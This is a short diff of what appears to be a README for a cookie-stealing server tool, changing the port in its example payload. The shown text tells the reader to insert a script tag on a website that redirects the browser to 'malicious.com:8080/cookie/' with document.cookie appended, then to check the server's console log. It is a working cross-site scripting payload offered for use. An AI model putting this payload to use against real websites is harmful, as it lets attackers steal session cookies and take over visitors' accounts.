@@ -68,7 +68,7 @@ node server.js ./module/template.js 8080
 Insert your payload on the website : 
 
 ```
-<script>document.location='http://malicious.com/cookie/'+document.cookie</script>
+<script>document.location='http://malicious.com:8080/cookie/'+document.cookie</script>
 ```
 
 #### 3) Check the console log
